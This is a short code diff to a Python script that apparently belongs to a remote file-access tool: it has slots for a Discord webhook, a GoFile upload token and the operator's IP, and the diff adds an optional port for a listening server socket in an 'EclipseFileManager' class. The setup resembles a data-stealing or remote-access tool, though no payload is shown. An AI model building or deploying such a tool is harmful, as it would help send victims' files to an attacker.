@@ -14,9 +14,10 @@ import requests
 import socket
 from discord_webhook import DiscordWebhook
 
-__webhook__ = ""  # Put your webhook here
-__gofileToken__ = ""  # Put your GoFile token here
+__webhook__ = ''  # Put your webhook here
+__gofileToken__ = ''  # Put your GoFile token here
 __ip__ = ''  # Put your machines IP here
+__PORT__ = '' # leave this blank if u don't know what it means
 
 
 class Util(object):
@@ -199,7 +200,10 @@ class EclipseFileManager():
     def __init__(this):
         this.modules = Modules()
         this.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        this.port = 5475
+        if __PORT__ == "":
+            this.port = 5475
+        else:
+            this.port = __PORT__
         this.server_socket.bind((socket.gethostbyname(socket.gethostname()), this.port))
 
     def checkip(this):
